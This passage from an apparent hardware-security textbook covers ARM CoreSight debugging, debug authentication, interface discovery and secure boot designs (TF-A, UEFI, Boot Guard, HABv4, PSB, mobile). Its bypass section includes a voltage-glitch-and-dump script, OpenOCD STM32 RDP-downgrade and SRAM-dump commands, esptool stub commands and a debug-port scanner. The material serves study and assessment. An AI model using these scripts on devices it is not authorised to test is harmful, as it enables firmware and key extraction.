**Debug components.** Each processor core and many peripherals have associated debug components: a Debug Unit (breakpoints, watchpoints, single-step), an ETM (instruction and data trace), a CTI (cross-trigger interface), and a PMU (performance monitoring unit). These components are memory-mapped on the debug APB and are accessed through the DAP.

**ROM Table.** A discoverable data structure at a known address in the debug APB address space. The ROM Table contains entries pointing to each debug component's base address, along with identification registers (PIDR0–PIDR7, CIDR0–CIDR3) that identify the component type and version. The debug probe navigates the ROM Table to discover which debug components are present and where they are mapped.

**Trace infrastructure.** The trace path: ETM (generates trace data) → ATB (Advanced Trace Bus — a packet-switched on-chip bus) → Trace Funnel (merges multiple ATB sources) → ETF (Embedded Trace FIFO — buffers trace data) → TPIU (outputs trace data off-chip via SWO or a parallel trace port) or ETB (stores trace data in on-chip SRAM for later retrieval via the DAP).

### 3.2 ROM Table navigation

ROM Table discovery is the first step in CoreSight enumeration. The ROM Table is at a base address typically pointed to by AP register 0xF8 (BASE register in MEM-AP). Each ROM Table entry is a 32-bit word containing: an offset (bits [31:12]) to the component's base address, a present bit (bit 0), and a power-domain indication (bit 1). The probe reads entries sequentially until it encounters an all-zero entry (end marker).

For each present component, the probe reads the identification registers:

- **PIDR0–PIDR4 (Peripheral Identification Registers).** Contain the component's part number, designer ID (JEDEC code), revision, and customer modification. The part number identifies the component type: 0x906 = CTI, 0x961 = TMC (Trace Memory Controller), 0x975 = ETM (Cortex-M), 0x4A13 = ETMv4 (Cortex-A/R).
- **CIDR0–CIDR3 (Component Identification Registers).** Contain the component class: 0x1 = ROM Table, 0x9 = CoreSight component, 0xB = CoreLink component, 0xF = Generic IP component. The preamble bytes (0x0D, 0x00, 0x05, 0xB1) serve as a signature to verify that the address does contain a valid CoreSight component.
- **DEVTYPE.** Identifies the component's functional type (trace source, trace link, trace sink, debug, monitor, etc.) and sub-type.
- **DEVARCH.** On newer components, provides the architecture version (ETMv4.x, CTI v2, etc.).

Tools for CoreSight enumeration: OpenOCD (`dap info` command), PyOCD (`pyocd pack --find` followed by `pyocd commander`), and ARM DS-5/Development Studio provide automated ROM Table walking and component identification.

ROM Table enumeration is also the first step in identifying undocumented debug components. SoC vendors frequently embed proprietary debug components (custom trace sources, hardware event counters, power-management debug interfaces) that are listed in the ROM Table but not documented in the public datasheet. These components have PIDR values with the vendor's JEDEC code but non-standard part numbers. The security researcher can identify these components by systematically reading their register spaces and comparing behavior across SoC revisions. Undocumented debug components have historically provided unintended access to security-sensitive subsystems — for example, a proprietary debug component on certain Qualcomm Snapdragon SoCs provided direct access to the secure world's memory map through an APB-AP that was not documented and was not subject to the standard SPIDEN authentication check.

### 3.3 CTI, ETM, ITM, and TPIU

**CTI (Cross-Trigger Interface).** Routes trigger events between CoreSight components. A trigger from one component (e.g., a breakpoint hit in processor core 0) can be routed through the CTI network to another component (e.g., halting processor core 1, enabling ETM trace on core 2, or triggering a timestamp). The CTI uses a channel-based routing scheme: events are mapped to channels (0–3), and channels are routed through a CTM (Cross-Trigger Matrix) to destination components. In security context, CTI enables synchronized debug across multiple security domains — for example, triggering a halt in the secure world when a breakpoint is hit in the normal world, or vice versa.

**ETM (Embedded Trace Macrocell).** Generates a cycle-accurate trace of instruction execution (program flow trace) and optionally data accesses (data trace). ETMv4 (used on Cortex-A/R) supports: trace filtering (trace only specific address ranges, exception levels, or security states), ViewInst events (start/stop trace based on address match or counter), timestamp packets (correlation with other trace sources), and conditional tracing (trace only taken/not-taken branches, or only specific instruction types). ETM generates a compressed trace stream that is output via the TPIU or stored in the ETB/ETF for later retrieval. ETM trace reveals the exact execution path through the firmware, including through security-critical code paths (signature verification, key management, privilege transitions). If ETM is not disabled by debug authentication, an attacker with physical access can trace the entire boot process, identifying the exact instructions responsible for security decisions.

**ITM (Instrumentation Trace Macrocell).** Provides a printf-like debug output channel: firmware writes to ITM stimulus ports (32 ports, each 32 bits wide, memory-mapped), and the ITM formats the data into packets output via SWO (Serial Wire Output — a single-pin trace output). ITM is lower bandwidth than ETM but requires no special trace infrastructure — just the SWO pin (which is often available even on production boards, shared with a JTAG TDO pin). In security context, ITM output from a device's debug port may leak sensitive information (cryptographic intermediate values, authentication decisions, error messages with security-relevant detail) if the developer left ITM-enabled debug output in production firmware.

**TPIU (Trace Port Interface Unit).** Formats trace data from multiple sources (ETM, ITM, STM) for output: via SWO (1 pin, Manchester or UART encoding, lower bandwidth) or via a parallel trace port (4/8/16 data pins + clock, higher bandwidth). The TPIU adds framing and synchronization to the trace stream. TPIU output is captured by a trace probe (Lauterbach PowerTrace, ARM DSTREAM, Segger J-Trace) for offline analysis.

### 3.4 Debug authentication

ARM defines four debug authentication signals that control access to the debug infrastructure:

- **DBGEN (Debug Enable).** Controls invasive debug for the non-secure state: halt, single-step, breakpoints. When DBGEN=0, the debug probe cannot halt the non-secure processor or set breakpoints.
- **NIDEN (Non-invasive Debug Enable).** Controls non-invasive debug for the non-secure state: trace (ETM), performance monitoring (PMU). When NIDEN=0, ETM does not generate trace for non-secure code.
- **SPIDEN (Secure Privileged Invasive Debug Enable).** Controls invasive debug for the secure state (TrustZone secure world). When SPIDEN=0, the debug probe cannot halt the secure processor or set breakpoints in secure code.
- **SPNIDEN (Secure Privileged Non-invasive Debug Enable).** Controls non-invasive debug for the secure state. When SPNIDEN=0, ETM does not generate trace for secure-state code.

These signals are typically controlled by hardware (OTP fuses, secure debug authentication logic, or JTAG-level commands). The `DBGAUTHSTATUS_EL1` register (readable via SWD/JTAG if any debug is enabled) reports the current state of all four signals. On production devices, the typical configuration is: DBGEN=0, NIDEN=0, SPIDEN=0, SPNIDEN=0 — all debug disabled. Some vendors partially disable debug: DBGEN=1 (normal-world debug enabled) but SPIDEN=0 (secure-world debug disabled), allowing developers to debug application code while protecting secure firmware.

**ARM Secure Debug Channel (SDC).** ARM's newer debug authentication mechanism (introduced in ARMv8.4-A) allows runtime debug authentication: a debug probe presents a certificate (signed by the device's debug authentication key) to the target, and the target's secure firmware validates the certificate before enabling debug. This allows field debugging of production devices without permanently enabling debug access — the authentication key can be rotated, and certificates can have expiration times and scope limitations (e.g., enabling only non-invasive debug, or only for a specific exception level).

The SDC protocol operates through a dedicated mailbox register pair accessible via the debug AP. The probe writes a certificate blob to the SDC input register, triggers a secure interrupt (routed to the secure firmware via CTI), and the secure firmware validates the certificate against the device's provisioned debug authentication public key (stored in OTP fuses or in the secure element). If validation succeeds, the firmware asserts the appropriate DBGEN/SPIDEN signals, enabling the requested debug scope. The certificate format includes: the debug scope (which authentication signals to enable), a device identifier (binding the certificate to a specific device — preventing certificate reuse across devices), an expiration timestamp (limiting the validity window), and a nonce (preventing replay attacks). SDC is implemented on recent ARM Cortex-A platforms (A78, X2, V1 and later) and is supported by ARM's DSTREAM-PT probe and ARM Development Studio 2022.1+.

### 3.5 CoreSight exploitation vectors

CoreSight's comprehensive debug capabilities create corresponding attack surfaces when debug is not properly locked.

**Trace-based cryptographic key extraction.** ETM trace reveals the exact execution path through cryptographic implementations. For software AES, the trace shows which S-box entries are accessed (the specific addresses within the S-box table), which directly reveals the key bytes when correlated with known plaintext (this is effectively a software-level side-channel attack enabled by the trace interface). For RSA using the square-and-multiply algorithm, the trace shows the instruction sequence (squarings and multiplications), which directly reveals the private key bits — each bit of the exponent maps to either a squaring (0) or a squaring followed by a multiplication (1). This attack requires ETM to be enabled (NIDEN=1 or SPNIDEN=1) but does not require invasive debug (no halting or breakpoints) — the attacker passively collects the trace stream while the device performs cryptographic operations.

**CTI-based security domain bridging.** The Cross-Trigger Interface routes events between security domains. An attacker with normal-world debug access (DBGEN=1, SPIDEN=0) can use the CTI to: trigger a halt in the secure world (if the CTI routing is not properly configured to block cross-domain trigger propagation), synchronize a fault-injection attack with secure-world execution (using a CTI output event to trigger an external glitcher at the exact moment the secure world processes sensitive data), and correlate normal-world and secure-world activity (by observing timing relationships between normal-world debug events and their secure-world consequences). Proper CTI configuration must ensure that cross-domain trigger routing respects the debug authentication state — a trigger from a non-secure debug source should not propagate to a secure debug destination when SPIDEN=0.

**ITM information leakage in production firmware.** Developers frequently use ITM stimulus ports for printf-style debugging during development. If the ITM configuration is not explicitly disabled in production firmware (and if NIDEN=1, which some vendors leave enabled for field diagnostics), the debug port leaks developer debug output. This output frequently contains: authentication decisions ("auth: user admin, password OK"), cryptographic operation status ("AES encrypt: key loaded from slot 3"), error details ("TLS handshake failed: certificate expired, CN=internal.corp.example.com"), and memory addresses (which defeat ASLR-like randomization schemes). The mitigation is straightforward: production firmware must explicitly clear the ITM's ITMENA bit in the DEMCR register, and NIDEN should be fused to 0 on production devices.

### 3.6 Debug authentication bypass techniques

When debug authentication signals are asserted by hardware fuses or authentication logic, the attacker must bypass the authentication mechanism itself rather than merely connecting a probe. The following techniques target specific platforms and debug protection implementations. Each technique has prerequisites that constrain its applicability.

**ARM DBGEN/SPIDEN signal bypass via voltage glitching.** The debug authentication signals (DBGEN, SPIDEN, NIDEN, SPNIDEN) are typically driven by combinational logic that reads OTP fuse values during boot. The fuse-read operation occurs in a narrow timing window — typically a few microseconds during the SoC's power-on-reset sequence. A precisely timed voltage glitch during this window causes the fuse sense amplifier to return the wrong value, reading a blown fuse as unblown (debug enabled). The attack flow: (1) profile the target's boot power trace to identify the fuse-read timing (Chapter 17A §3 for power trace acquisition, Chapter 17B §4 for glitch parameter calibration), (2) connect a glitch circuit (ChipWhisperer, PicoGlitcher, or custom MOSFET crowbar) to the target's VCC, (3) connect the debug probe to SWD/JTAG, (4) trigger a reset and inject the glitch at the calibrated offset, (5) immediately attempt a debug connection — if the glitch succeeded, the debug port responds to DPIDR reads and the DBGAUTHSTATUS register shows the authentication signals as asserted. The voltage glitch parameters and fault injection methodology are detailed in Chapter 17B §8; this section covers only the JTAG/SWD-specific attack flow.

A Python script that automates the glitch-and-probe loop using ChipWhisperer and pyOCD demonstrates the integration between fault injection and debug exploitation.

```python
import chipwhisperer as cw
from pyocd.core.helpers import ConnectHelper

scope = cw.scope()
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"

# Sweep glitch parameters — offset and width
for offset in range(1800, 2200):
    for width in range(5, 30):
        scope.glitch.ext_offset = offset
        scope.glitch.repeat = width
        # Trigger target reset (via GPIO or power toggle)
        scope.io.nrst = 'low'
        scope.io.nrst = 'high'
        # Arm the glitch — fires on next trigger edge
        scope.arm()
        # Wait for glitch to fire (external trigger from reset-release)
        scope.capture()
        # Attempt SWD connection
        try:
            session = ConnectHelper.session_with_chosen_probe(
                target_override='cortex_m',
                connect_mode='under-reset',
                options={'probe_all_aps': True}
            )
            target = session.target
            # Read DBGAUTHSTATUS to confirm bypass
            auth_status = target.read32(0xE000EFB8)
            if auth_status & 0xF:  # any auth signal asserted
                print(f"[+] Bypass at offset={offset} width={width}")
                print(f"    DBGAUTHSTATUS = 0x{auth_status:08X}")
                # Dump firmware immediately
                data = target.read_memory_block8(0x00000000, 0x80000)
                with open("firmware_dump.bin", "wb") as f:
                    f.write(bytes(data))
                break
            session.close()
        except Exception:
            pass  # connection failed — glitch missed, continue sweep
```

**STM32 RDP Level 1 → Level 0 downgrade.** STM32 microcontrollers implement Read-out Protection at three levels: Level 0 (no protection — debug fully enabled), Level 1 (flash read-out disabled via debug, but SRAM readable; mass erase reverts to Level 0), and Level 2 (permanent — debug permanently disabled, irreversible). Level 1 is commonly deployed on production devices because it allows recovery via mass erase. The downgrade attack exploits the mass-erase path: the attacker connects via SWD, issues the mass-erase command through the flash controller registers (FLASH_CR.MER bit on STM32F4, or via OpenOCD's `stm32f4x mass_erase 0` command), and the device reverts to RDP Level 0 — erasing all flash content but re-enabling full debug access to SRAM (which may still contain secrets if the device was powered during the erase). On STM32F0/F1/F3, voltage glitching the RDP check during boot allows reading flash without triggering mass erase — the glitch causes the RDP level check to return Level 0 while the actual fuse remains at Level 1, granting full flash read access (Chapter 17B §8.2 for the glitch timing details).

```bash
# OpenOCD: mass erase STM32 to downgrade from RDP Level 1 to Level 0
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg \
        -c "init" -c "halt" -c "stm32f4x mass_erase 0" -c "shutdown"

# After mass erase, reconnect — debug is now fully enabled
openocd -f interface/stlink.cfg -f target/stm32f4x.cfg \
        -c "init" -c "halt" -c "dump_image sram_secrets.bin 0x20000000 0x20000" \
        -c "shutdown"
```

**nRF52 APPROTECT bypass (CVE-2020-27211).** Nordic Semiconductor's nRF52 series uses the APPROTECT register (at address 0x10001208 in UICR) to disable debug access. When APPROTECT is set to 0x00, the Access Port is disabled and SWD operations return FAULT. LimitedResults (the security research group) demonstrated that a precisely timed voltage glitch on the nRF52's VDD during the APPROTECT register read at boot causes the fuse to read as 0xFF (unprotected), re-enabling the Access Port. The glitch window is approximately 5-10 nanoseconds wide, occurring within the first 10 microseconds after reset release. The attack requires a sub-nanosecond-resolution glitcher (ChipWhisperer-Husky or a custom FPGA-based glitcher) and typically succeeds within a few hundred attempts. Nordic's mitigation (in nRF52 revisions with the APPROTECT hardware fix, and in nRF53/nRF91 series) moves the APPROTECT check into hardware logic that is not susceptible to single-glitch bypass — the check is performed redundantly with voting logic. CVE-2020-27211 affects all nRF52832 and nRF52840 devices manufactured before the hardware fix (approximately 2021 and earlier).

**ESP32 secure boot bypass via UART bootloader.** The ESP32's ROM bootloader includes a UART download mode (entered by holding GPIO0 low during reset) that allows loading and executing arbitrary code via the serial port. On devices where Secure Boot is enabled, the UART bootloader is supposed to enforce signature verification on downloaded code. However, several bypass routes exist: (1) on early ESP32 revisions (ECO0/ECO1), a flaw in the UART bootloader's signature verification allows loading unsigned stubs by exploiting the bootloader's stub-loading mechanism (the stub is loaded before signature verification completes), (2) on ESP32-S2, CVE-2023-35818 demonstrated that a fault injection on the eFuse controller during the secure boot configuration read could disable signature enforcement, and (3) on all ESP32 variants, if the UART download mode disable eFuse (UART_DOWNLOAD_DIS) is not burned, the UART bootloader remains accessible even on secure-boot-enabled devices — it simply requires a signed image, but the signed-stub bypass eliminates this requirement.

```bash
# esptool.py: interact with ESP32 UART bootloader
# Check chip info and security status
esptool.py --port /dev/ttyUSB0 chip_id
esptool.py --port /dev/ttyUSB0 get_security_info

# Read flash contents (if not protected)
esptool.py --port /dev/ttyUSB0 read_flash 0x0 0x400000 esp32_flash.bin

# On bypass: load a custom stub that dumps eFuse values
esptool.py --port /dev/ttyUSB0 run_stub --stub custom_dump_stub.json
```

**Automated debug port scanner.** When assessing a batch of devices or an unknown target, an automated scanner that iterates over common debug probe configurations accelerates the discovery phase. The following Python script uses pyOCD to probe for accessible debug ports across multiple target types.

```python
import subprocess
import sys

TARGETS = [
    "cortex_m", "cortex_m0", "cortex_m3", "cortex_m4", "cortex_m7",
    "nrf52832", "nrf52840", "stm32f407vg", "stm32f103c8",
    "lpc1768", "rp2040", "efr32mg12p"
]

def probe_target(target_type):
    """Attempt SWD connection with given target override."""
    try:
        result = subprocess.run(
            ["pyocd", "commander", "-t", target_type,
             "--connect-mode", "under-reset",
             "-c", "read32 0xE000ED00; read32 0xE000EFB8; exit"],
            capture_output=True, text=True, timeout=10
        )
        if "0x" in result.stdout and "fault" not in result.stdout.lower():
            return True, result.stdout.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return False, ""

print("[*] Scanning debug ports...")
for t in TARGETS:
    ok, output = probe_target(t)
    if ok:
        print(f"[+] {t}: accessible — CPUID / DBGAUTHSTATUS:\n    {output}")
    else:
        print(f"[-] {t}: no response or protected")
```

---

## 4. Debug interface discovery

### 4.1 JTAGulator

The JTAGulator (Grand Idea Studio / Joe Grand) is a dedicated hardware tool for identifying JTAG and UART interfaces on unknown PCBs. It operates by systematically testing all possible pin combinations on a set of candidate pins (up to 24 channels) and looking for valid responses.

**JTAG identification.** The JTAGulator cycles through all permutations of TCK, TMS, TDI, and TDO assignments among the candidate pins. For each permutation, it attempts a JTAG reset (TMS high for 5 cycles) followed by a Shift-DR to read the IDCODE. If a valid IDCODE is received (32-bit value with bit 0 = 1 and a recognized JEDEC manufacturer ID), the permutation is reported as a valid JTAG pinout. The search space is P(n,4) permutations (for n candidate pins — 24 pins yields 255,024 permutations, each tested in milliseconds). A full scan of 24 pins completes in minutes.

**BYPASS scan.** For devices without IDCODE (or with BYPASS as the default post-reset instruction), the JTAGulator uses the BYPASS scan: it loads a known pattern into TDI, shifts it through the chain, and looks for the pattern (delayed by one cycle per device) on TDO. This identifies valid TCK/TMS/TDI/TDO assignments even without IDCODE.

**UART identification.** The JTAGulator monitors each candidate pin for UART-like activity: serial data at common baud rates (9600, 19200, 38400, 57600, 115200, 230400). It identifies UART TX (the pin emitting data) by detecting valid ASCII characters (printable characters, newlines) in the received data. UART RX is identified by sending a newline character and observing whether the device responds.

### 4.2 Other discovery tools and techniques

**Glasgow Interface Explorer.** An open-source FPGA-based tool that implements multiple protocols (JTAG, SWD, SPI, I²C, UART, logic analyzer) in a single device. Glasgow's FPGA fabric can be reprogrammed at runtime to implement arbitrary protocols, making it versatile for unknown interfaces. Glasgow's JTAG applet automates pin discovery similar to JTAGulator.

**Bus Pirate.** A multi-protocol interface tool that supports JTAG (via OpenOCD integration), SPI, I²C, UART, and 1-Wire. The Bus Pirate is lower-speed than Glasgow but simpler to use and widely available. For JTAG, the Bus Pirate connects to OpenOCD, which handles protocol operations and target identification.

**Manual pin identification.** When automated tools are unavailable or the candidate pin count is too high, manual techniques narrow the search:
- **Voltage probing**: measure the steady-state voltage on each candidate pin. JTAG pins typically idle at VCC (TMS, TDI are pulled high via internal or external pull-ups, typically 10k–100kΩ) or float (TDO is driven only during shifts — it may show a weak pull-up or float near mid-rail). UART TX idles high (UART uses active-low signaling, so the TX line rests at VCC when no data is being transmitted). Ground pins are at 0V. VCC pins are at the supply voltage (3.3V or 1.8V typical for modern embedded devices). SWDIO idles high (pull-up), SWCLK idles low on most platforms. TRST (if present) idles high (active-low reset, pulled up).
- **Oscilloscope observation**: power on the device and observe each candidate pin on an oscilloscope. UART TX shows data bursts during boot (boot messages — typically 115200 baud 8N1, appearing as regular bit patterns with consistent timing). JTAG pins are typically quiet unless a debug probe is connected (no self-clocking). Clock outputs show a regular periodic signal. SWO (Serial Wire Output) may show Manchester-encoded trace data if the firmware has ITM enabled.
- **Continuity testing**: trace each candidate pin back to the IC it connects to, then check the IC's datasheet for the pin function. This is the most reliable method but requires component identification (§2 in Chapter 17C). On multi-layer PCBs where traces are not visible on the surface, use an X-ray machine or a multimeter in continuity mode with fine-pitch probes to trace connections between test points and IC pins.
- **Logic analyzer sweeping**: connect a multi-channel logic analyzer (Saleae Logic Pro 16, DSLogic) to all candidate pins simultaneously and capture during boot. The boot sequence often reveals pin functions: UART TX shows ASCII-decodable data, SPI communications appear as coordinated clock-data-chipselect patterns, I²C shows its characteristic start-condition-address-data pattern. This technique identifies not only debug interfaces but also all active communication buses on the board, which are valuable for understanding the system architecture.

---

## 5. Secure boot architectures

### 5.1 Chain of trust model

Secure boot establishes a chain of trust from an immutable root (hardware) to the final software (OS kernel, application). Each stage in the chain verifies the integrity and authenticity of the next stage before executing it. If any stage fails verification, the boot process halts (or enters a recovery mode).

The generic chain: **Hardware Root of Trust** (mask ROM, CPU microcode, or secure element — immutable, implicitly trusted) → **First-stage bootloader** (BL1 — verified by the RoT against a key hash stored in OTP fuses) → **Second-stage bootloader** (BL2 — verified by BL1 against a key embedded in BL1 or in OTP) → **Firmware/OS** (BL33 — verified by BL2 or by a chain of intermediate bootloaders). Each verification uses asymmetric cryptography (RSA-2048/4096, ECDSA P-256/P-384, or Ed25519) to check a digital signature on the next stage's image.

The security of the chain depends entirely on the root: if the root of trust is compromised (BootROM vulnerability, OTP key extraction, or fault injection to bypass root verification — Chapter 17B §4), the entire chain collapses. This is why BootROM vulnerabilities (like checkm8, §6.1) are considered the highest-severity hardware security issues — they are unfixable (the BootROM is in mask ROM) and affect all manufactured units.

### 5.2 ARM Trusted Firmware (TF-A)

ARM Trusted Firmware (TF-A, formerly ATF) is the reference secure firmware implementation for ARMv8-A platforms (Cortex-A series). TF-A defines a standardized boot flow with named boot stages:

**BL1 (Boot Loader stage 1).** Runs from the BootROM or an immutable flash region. BL1 performs initial platform setup (cache configuration, MMU initialization for the firmware), loads BL2 from storage (typically eMMC, NAND, or SPI flash), verifies BL2's signature against a trusted key, and transfers control to BL2. BL1 runs at the highest exception level (EL3 on AArch64).

**BL2 (Boot Loader stage 2).** Runs from SRAM or DRAM (after DRAM initialization, if needed). BL2 loads and verifies subsequent images: BL31 (EL3 runtime firmware), BL32 (secure-world OS, e.g., OP-TEE), and BL33 (normal-world bootloader, e.g., U-Boot or UEFI). BL2 performs the cryptographic verification of each image and sets up the initial page tables and security configuration (TZASC — TrustZone Address Space Controller, GIC — Generic Interrupt Controller security configuration).

**BL31 (EL3 Runtime).** The EL3 runtime firmware that persists after boot. BL31 handles Secure Monitor Calls (SMCs) — the interface between the normal world (EL1/EL2) and the secure world (S-EL1/S-EL2). BL31 manages world switching, power management (PSCI — Power State Coordination Interface), and platform-specific runtime services.

**BL32 (Secure-world OS).** The trusted OS running in the secure world (S-EL1). Common implementations: OP-TEE (Open Portable Trusted Execution Environment — open source, widely used on Linux platforms), Trusty (Google's trusted OS for Android), Qualcomm's QTEE (Qualcomm Trusted Execution Environment), and Samsung's TEEGRIS.

**BL33 (Normal-world bootloader).** The non-secure bootloader that loads the main OS. Typically U-Boot (on embedded Linux platforms) or UEFI (on server/workstation platforms).

### 5.3 UEFI Secure Boot

UEFI Secure Boot (defined in the UEFI specification, Chapter 32) prevents the execution of unsigned or unauthorized UEFI applications and drivers during boot. The key hierarchy:

**PK (Platform Key).** The root key, owned by the platform manufacturer (OEM). The PK authorizes changes to the KEK database. Only one PK is active at a time. The PK is typically an RSA-2048 certificate owned by the OEM (Dell, HP, Lenovo, etc.).

**KEK (Key Exchange Key).** Authorizes changes to the db and dbx databases. Multiple KEKs can be enrolled — typically one from the OEM and one from Microsoft (allowing Microsoft to update the db/dbx via Windows Update).

**db (Authorized Signatures Database).** Contains certificates and hashes of authorized UEFI binaries. Any UEFI application signed by a certificate in db, or whose hash is in db, is allowed to execute. Microsoft's UEFI CA certificate is in db on most consumer PCs, allowing any binary signed by Microsoft to execute.

**dbx (Forbidden Signatures Database).** Contains certificates and hashes of specifically forbidden binaries. Binaries matching dbx are rejected even if they would otherwise be authorized by db. The dbx is used to revoke compromised bootloaders and vulnerable UEFI drivers. Microsoft publishes regular dbx updates to revoke known-vulnerable binaries.

**Shim and MOK (Machine Owner Key).** On Linux systems, a signed shim bootloader (signed by Microsoft's UEFI CA) is the first UEFI application executed. Shim then validates the actual bootloader (GRUB2, systemd-boot) against its own key database (the MOK — Machine Owner Key, managed by the user). This two-stage verification allows Linux distributions to use their own signing keys without requiring Microsoft to sign every kernel and bootloader update.

### 5.4 Intel Boot Guard

Intel Boot Guard is a hardware-rooted secure boot mechanism for Intel platforms. The OEM provisions a public key hash into the CPU's one-time-programmable fuses (Field Programmable Fuses — FPF) during manufacturing. At boot, the CPU's Authenticated Code Module (ACM — a signed firmware blob loaded from the SPI flash and verified by the CPU's internal microcode) verifies the Initial Boot Block (IBB — the first code in the BIOS/UEFI firmware) against the fused key hash.

**Verified Boot mode.** The ACM verifies the IBB's signature and halts boot if verification fails. This prevents boot from modified firmware.

**Measured Boot mode.** The ACM measures (hashes) the IBB and extends the measurement into the TPM's Platform Configuration Register (PCR0). Boot proceeds regardless of the measurement value, but the measurement can be checked later by remote attestation. Measured boot does not prevent boot from modified firmware — it only records whether the firmware was modified.

**Key provisioning and lock.** The OEM burns the key hash into the CPU's FPF during manufacturing, then sets a lock bit that prevents further modification. Once locked, the Boot Guard key cannot be changed. This means: (1) the OEM controls which firmware runs on the platform, (2) the end user cannot disable Boot Guard (it's in CPU fuses, not in a firmware setting), and (3) a compromised OEM key compromises all platforms that were provisioned with that key.

**Boot Guard misconfiguration.** Some OEMs ship platforms with Boot Guard provisioned but not enforced: the key hash is burned into the fuses, but the enforcement policy fuses are not set (the ACM falls through to unverified boot). This is detectable by reading the Boot Guard status through the HECI (Host Embedded Controller Interface) or by examining the FPF state through Intel's MEinfo tool. Platforms with Boot Guard provisioned but not enforced are vulnerable to SPI flash modification — the attacker can modify the BIOS firmware without detection. Research by Alex Matrosov (Binarly) has demonstrated that Boot Guard misconfiguration affects multiple OEM product lines across Dell, Lenovo, and others — some platforms ship with Boot Guard enabled in measured-only mode (no enforcement) due to supply-chain configuration errors during manufacturing. The chipsec tool (`chipsec_main --module common.secureboot.te`) can remotely audit Boot Guard enforcement status.

### 5.5 NXP i.MX HABv4 and AMD Platform Secure Boot

**NXP i.MX HABv4 (High Assurance Boot version 4).** The secure boot mechanism for NXP i.MX6/i.MX7/i.MX8 SoCs (widely used in industrial, automotive, and IoT applications). HABv4 operates during the BootROM phase: the ROM reads a CSF (Command Sequence File) appended to the boot image, which contains a sequence of HAB commands (Authenticate Data, Install Key, Set parameters). Each command is processed sequentially by the HAB library (embedded in the BootROM):

The key hierarchy: the SRK (Super Root Key) table contains up to four RSA-2048/4096 or ECDSA P-256 public keys. The SHA-256 hash of the SRK table is burned into the SoC's OTP fuses (OCOTP_SRK0 through OCOTP_SRK7 — eight 32-bit fuse words = 256-bit hash). During boot, the BootROM hashes the SRK table from the boot image and compares it against the fused hash. If they match, one of the SRK keys is used to verify a CSF key certificate, which in turn verifies the boot image signature. The four-key SRK table provides key rotation capability: if one SRK key is compromised, the OEM can revoke it by burning the corresponding SRK_REVOKE fuse bit and re-sign firmware with a different SRK.

HABv4 operates in two modes: Open (HAB events are logged but boot proceeds regardless — used during development) and Closed (HAB failures halt boot — production mode). The mode is controlled by the SEC_CONFIG fuse. The critical configuration step: after firmware is signed and validated, the OEM burns the SEC_CONFIG fuse to switch from Open to Closed mode. Devices left in Open mode in production are completely unprotected — HABv4 logs signature failures but executes the firmware anyway.

HABv4 forensic artifacts: the HAB library writes event records to a region of OCRAM (On-Chip RAM) that persists through warm resets. These events include: authentication success/failure, key installation status, and CSF parsing errors. On a device with JTAG/SWD access (or after a warm-reset attack that preserves OCRAM), the analyst can read the HAB event log using NXP's hab_status tool or by directly reading the OCRAM region.

**AMD Platform Secure Boot (PSB).** AMD's equivalent of Intel Boot Guard. The AMD Platform Security Processor (PSP, previously called AMD Secure Technology — a dedicated ARM Cortex-A5 core embedded in every AMD CPU since the Zen architecture) verifies the BIOS firmware before the x86 cores begin executing. The PSP boot flow: the PSP ROM (immutable, in the PSP's on-chip ROM) loads and verifies the PSP Off-chip Bootloader (signed by AMD's root key) from the SPI flash, the Off-chip Bootloader initializes DRAM and loads subsequent PSP firmware (each stage signed), and finally the PSP verifies the BIOS/UEFI firmware (the x86 initialization code) against the OEM's public key hash (fused into the CPU's OTP during manufacturing — similar to Intel's FPF provisioning).

PSB enforcement is controlled by fuses: BIOS_RTM_SIGNING_REQUIRED determines whether the PSP halts boot on verification failure (equivalent to Intel Boot Guard's verified boot mode). As with Intel, OEMs can ship with PSB provisioned but not enforced. The PSP also provides a Firmware TPM (fTPM) implementation, memory encryption (SME/SEV — Domain 7B), and secure debug authentication. CVE-2021-26311 and related PSP vulnerabilities have demonstrated that the PSP's firmware (while signed) is not immune to implementation bugs — buffer overflows in PSP firmware handlers have been exploited to achieve code execution on the PSP, compromising the entire platform's root of trust.

### 5.6 Mobile platform secure boot

**Qualcomm Secure Boot.** Qualcomm's boot chain on Snapdragon SoCs: PBL (Primary Boot Loader, in mask ROM) → SBL (Secondary Boot Loader) → TZ (TrustZone kernel, QSEE — Qualcomm Secure Execution Environment) → ABL (Android Boot Loader) → Linux kernel. Each stage is signed with Qualcomm's OEM-specific signing keys. The root key hash is in QFPROM (Qualcomm's fuse block). Anti-rollback counters (also in QFPROM fuses) prevent downgrade attacks: each firmware version increments the counter, and the bootloader refuses to load firmware with a counter value lower than the fused minimum.

**Android Verified Boot (AVB).** Google's boot verification framework. AVB uses a vbmeta image (a signed data structure containing hash descriptors for all protected partitions — boot, system, vendor, dtbo). The bootloader (ABL) verifies the vbmeta signature against a key embedded in the bootloader or stored in a tamper-resistant location (TEE, hardware fuse). AVB supports rollback protection: rollback index values are stored in tamper-resistant storage (RPMB partition of eMMC/UFS), and the bootloader refuses to boot an image with a lower rollback index.

AVB defines device states: LOCKED (full verification, boot halts on failure), UNLOCKED (verification is performed but boot proceeds regardless — for developer devices), and custom states. Unlocking the bootloader typically requires an OEM-specific command (`fastboot oem unlock` or `fastboot flashing unlock`) that triggers a factory reset (erasing user data) to prevent an attacker from unlocking the bootloader to bypass verified boot while preserving the victim's data.

**iOS Secure Boot.** Apple's boot chain: BootROM (mask ROM in the application processor) → iBoot (first-stage bootloader, loaded from NOR flash) → kernel cache (the XNU kernel and kernel extensions). Each stage is verified using Apple's root certificate (embedded in the BootROM). SHSH blobs (signed hash values) are device-specific and firmware-version-specific, generated by Apple's signing server (TSS — Ticket Signing Server). The BootROM sends a nonce to TSS, and TSS returns a signed ticket (SHSH blob) that authorizes a specific firmware version on a specific device. Once Apple stops signing a firmware version, devices cannot downgrade to it (because TSS will not issue a new ticket). This "signing window" mechanism is Apple's primary anti-downgrade defense.

---

## 6. Secure boot bypass techniques

### 6.1 BootROM vulnerabilities

BootROM vulnerabilities are the most impactful class of secure boot bypass because the BootROM is immutable (in mask ROM) — there is no patch, no firmware update, no mitigation short of hardware revision.

